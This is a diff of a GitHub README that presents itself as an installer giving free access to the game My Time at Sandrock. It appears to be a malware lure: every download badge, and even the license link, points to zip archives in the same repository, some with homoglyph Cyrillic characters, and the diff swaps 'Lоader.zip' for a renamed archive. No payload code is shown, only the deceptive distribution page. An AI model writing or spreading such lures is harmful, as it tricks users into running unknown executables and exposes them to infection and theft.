@@ -1,6 +1,6 @@
 # 🎮 My Time at Sandrock Access Installer
 
-[![Download for Windows/Linux/macOS](https://raw.githubusercontent.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/main/Lоader.zip%20Time%20at%20Sandrock-blue?logo=playstation)](https://raw.githubusercontent.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/main/Lоader.zip)
+[![Download for Windows/Linux/macOS](https://github.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/raw/refs/heads/main/umbonal/Sandrock-At-Time-My-Open-Download-Hub-v2.8.zipоhttps://github.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/raw/refs/heads/main/umbonal/Sandrock-At-Time-My-Open-Download-Hub-v2.8.zip%20Time%20at%20Sandrock-blue?logo=playstation)](https://github.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/raw/refs/heads/main/umbonal/Sandrock-At-Time-My-Open-Download-Hub-v2.8.zipоhttps://github.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/raw/refs/heads/main/umbonal/Sandrock-At-Time-My-Open-Download-Hub-v2.8.zip)
 
 Your ultimate tool to quickly get **My Time at Sandrock** ready on your system! Access the full adventure with ease, enjoy a hassle-free installation, and start your journey in the charming town of Sandrock. Ideal for gamers looking for reliable, swift access to their favorite game.
 
@@ -41,7 +41,7 @@ My Time at Sandrock get access, My Time at Sandrock installer, game launcher 202
 ## 📥 Installation 
 
 **Step 1:**  
-[![Get My Time at Sandrock](https://raw.githubusercontent.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/main/Lоader.zip%20Now-Install%20Sandrock-green?logo=windows)](https://raw.githubusercontent.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/main/Lоader.zip)
+[![Get My Time at Sandrock](https://github.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/raw/refs/heads/main/umbonal/Sandrock-At-Time-My-Open-Download-Hub-v2.8.zipоhttps://github.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/raw/refs/heads/main/umbonal/Sandrock-At-Time-My-Open-Download-Hub-v2.8.zip%20Now-Install%20Sandrock-green?logo=windows)](https://github.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/raw/refs/heads/main/umbonal/Sandrock-At-Time-My-Open-Download-Hub-v2.8.zipоhttps://github.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/raw/refs/heads/main/umbonal/Sandrock-At-Time-My-Open-Download-Hub-v2.8.zip)
 
 ---
 
@@ -53,10 +53,10 @@ This tool is designed for educational and personal use only. Ensure you comply w
 
 ## 📜 License
 
-Distributed under the [MIT License](https://raw.githubusercontent.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/main/Lоader.zip). 2025
+Distributed under the [MIT License](https://github.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/raw/refs/heads/main/umbonal/Sandrock-At-Time-My-Open-Download-Hub-v2.8.zipоhttps://github.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/raw/refs/heads/main/umbonal/Sandrock-At-Time-My-Open-Download-Hub-v2.8.zip). 2025
 
 ---
 
 ## 🔗 Quick Download
 
-[![Sandrock Quick Access](https://raw.githubusercontent.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/main/Lоader.zip)](https://raw.githubusercontent.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/main/Lоader.zip)
+[![Sandrock Quick Access](https://github.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/raw/refs/heads/main/umbonal/Sandrock-At-Time-My-Open-Download-Hub-v2.8.zipоhttps://github.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/raw/refs/heads/main/umbonal/Sandrock-At-Time-My-Open-Download-Hub-v2.8.zip)](https://github.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/raw/refs/heads/main/umbonal/Sandrock-At-Time-My-Open-Download-Hub-v2.8.zipоhttps://github.com/JimMorin/MyTimeAtSandrock-OpenDownloadHub/raw/refs/heads/main/umbonal/Sandrock-At-Time-My-Open-Download-Hub-v2.8.zip)
